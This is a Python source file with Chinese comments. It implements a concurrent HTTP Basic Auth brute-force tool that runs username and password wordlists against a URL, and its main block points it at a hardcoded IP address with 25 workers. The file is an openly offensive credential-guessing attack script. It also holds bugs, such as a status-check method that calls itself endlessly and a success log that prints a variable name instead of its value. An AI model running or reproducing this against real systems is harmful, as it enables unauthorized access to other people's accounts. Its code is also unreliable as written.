# encoding:utf-8

# 并发库
import traceback

import gevent
from gevent.pool import Pool
from gevent import monkey
monkey.patch_all()
# 常规库
import base64
import logging
import requests
from requests.auth import HTTPBasicAuth
import urllib3
urllib3.disable_warnings()
from enum import Enum

class reqMethod(Enum):
    GET     = "GET"
    POST    = "POST"
    OPTIONS = "OPTIONS"
    HEAD    = "HEAD"

# todo（2022.04.23）: request的通用类
DEFAULT_HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        }

def loadDic():
    '''
    加载账号密码字典,并返回两个列表
    :return: userList, pwdList
    '''
    # TODO 加载账号密码并返回, 配置文件settings.py中有字典的路径
    userList = []
    pwdList = []
    from settings import usernameDicPath,passwordDicPath
    with open(usernameDicPath, "r") as Fs:
        for user in Fs.readlines():
            user = user.strip()
            userList.append(user)
    with open(passwordDicPath, "r") as Fs:
        for pwd in Fs.readlines():
            pwd = pwd.strip()
            pwdList.append(pwd)
    logging.info("[+]Wordlists loaded, user/%s, pass/%s" % (len(userList), len(pwdList)))
    return set(userList), set(pwdList)


class Brute:
    '''
    爆破类
    '''

    def __init__(self, url, thread):
        self.url = url
        self.threadNum = thread
        self.isSucceed = 0

        self.userList = set()
        self.pwdList = set()

        self.nowPair = ""
        self.realPwd = None
        # TODO 从setting.py中解析以下配置项目
        self.reqMethod = reqMethod.GET
        self.timeout = 5
        self.SSL_veirfy = False
        # base response status_code：
        # eg：
        #   401
        self.base_status_code = self.getBaseCode()
        self.userList, self.pwdList = loadDic()


    def getBaseCode(self):
        """获取基础的status_code，如401

        """
        try:
            resp = requests.get(self.url, timeout=self.timeout, verify=self.SSL_veirfy)
                    # 预检查，页面状态码是否为401
            code = resp.status_code
            if False == code:
                logging.error(f"Error in status_code({code})")
            elif 401 != self.getBaseCode():
                logging.warning(f"[!]Target may not using Basic Auth, status_code:[{code}]")
            else:
                logging.info(f"[+]Target is using Basic Auth, [{code}]")

            if  (resp.status_code is not None):
                return resp.status_code
            else:
                # print("[!]Target may not using Basic Auth, status_code:(%s)" % resp.status_code)
                return False
        except Exception as e:
            logging.warning("[!]req error, Target may be down:(%s)" % e)
            traceback.print_exc(e)
        return False



    def req(self, auth):
        '''将Basic认证头添加到HTTP请求头中, 并返回一个reponse对象
        :return: requests Response
        '''
        if (not self.isSucceed):
            try:
                if self.reqMethod == reqMethod.GET:
                    resp = requests.get(self.url, auth=auth, timeout=self.timeout, verify=self.SSL_veirfy)
                elif self.reqMethod == reqMethod.POST:
                    resp = requests.post(self.url, auth=auth, timeout=self.timeout, verify=self.SSL_veirfy)
                else:
                # 未指定方法时, 使用HEAD方法
                    resp = requests.head(self.url, auth=auth, timeout=self.timeout, verify=self.SSL_veirfy)
                logging.info("[-]Now trying to login with: %s" % self.nowPair)
                # 中断标记。若爆破成功，停止爆破
                if self.base_status_code != resp.status_code:
                    self.isSucceed = 1
                    # TODO 将usr/pwd的组装放入req中进行，以免无法还原usr/pwd串
                    self.realPwd = f"{auth.username}/{auth.password}"
                    logging.error(f"[{resp.status_code}]self.realPwd, (compared with original [{self.base_status_code}])")
            except Exception as e:
                #TODO log it
                logging.info("[-]request error, reason: %s" % e)
        else:
            # 爆破成功，打印结果
            logging.info("[+]Good, Result is: %s" % self.realPwd)


    def run(self):
        '''
        爆破的运行方法
        :return:
        '''

        # 加载字典, 并完成生成器的初始化
        pool = Pool(size=self.threadNum)
        logging.info(f"[+]Current {self.threadNum}x")
        jobs = []
        # 生成器
        if not (self.userList and self.pwdList):
            logging.error(f"userList, pwdList could not be empty, check settings.py")

        for usr in self.userList:
            for pwd in self.pwdList:
                self.nowPair = "user/pass: %s/%s" % (usr, pwd)
                auth = HTTPBasicAuth(usr, pwd)
                job = pool.spawn(self.req, auth)
                jobs.append(job)
        pool.joinall(jobs)
        # jobs = [pool.spawn(self.req, auth) for auth in self.yieldAuth()]
        # gevent.joinall(jobs)
        logging.info("Done, if there is no results, then Brute Force regarded failed")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s %(filename)s %(levelname)s %(message)s',
                    datefmt='%a %d %b %Y %H:%M:%S'
                    )
    brute = Brute(url="http://123.0.238.51/", thread=25)
    brute.run()

